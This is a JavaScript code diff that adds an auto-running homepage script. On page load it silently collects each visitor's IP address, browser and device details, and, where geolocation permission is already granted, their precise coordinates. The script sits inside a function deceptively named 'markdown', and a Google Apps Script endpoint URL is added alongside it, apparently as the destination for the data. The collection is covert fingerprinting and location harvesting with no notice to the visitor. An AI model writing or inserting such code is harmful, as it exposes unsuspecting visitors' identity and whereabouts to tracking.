@@ -1,3 +1,5 @@
+const appScriptUrl = "https://script.google.com/macros/s/AKfycbyerovyJhwPACBq_7Ri0tEei25wm8BhCJ7l-UTkdyGHjWu4n8ZrzaqzLhH5e6M6nNPh0A/exec";
+
 async function markdown(description, latitude, longitude, accuracy){
 	const xhttpr = new XMLHttpRequest(), agent = window.navigator.userAgent, platform = window.navigator.platform, ipAddress = await getIp();
 	const orientation = window.screen.orientation.type, logical = window.screen.width + " x " + window.screen.height, pxRatio = window.devicePixelRatio;
@@ -15,3 +17,30 @@ function getIp() {
 		resolve(ip["ip"]);
 	});
 }
+
+function getCoords() {
+  return new Promise((resolve, reject) =>
+    navigator.permissions ?
+
+      // Permission API is implemented
+      navigator.permissions.query({
+        name: 'geolocation'
+      }).then(permission =>
+        // is geolocation granted?
+        permission.state === "granted"
+          ? navigator.geolocation.getCurrentPosition(pos => resolve(pos.coords)) 
+          : resolve(null)
+      ) :
+
+    // Permission API was not implemented
+    reject(new Error("Permission API is not supported"))
+  )
+}
+
+getCoords().then(coords => {
+	if (coords != null){
+		markdown("Homepage AUTO", coords.latitude, coords.longitude, coords.accuracy);
+	} else {
+		markdown("Homepage AUTO", "Permission was not allowed", "", "");
+	}
+});
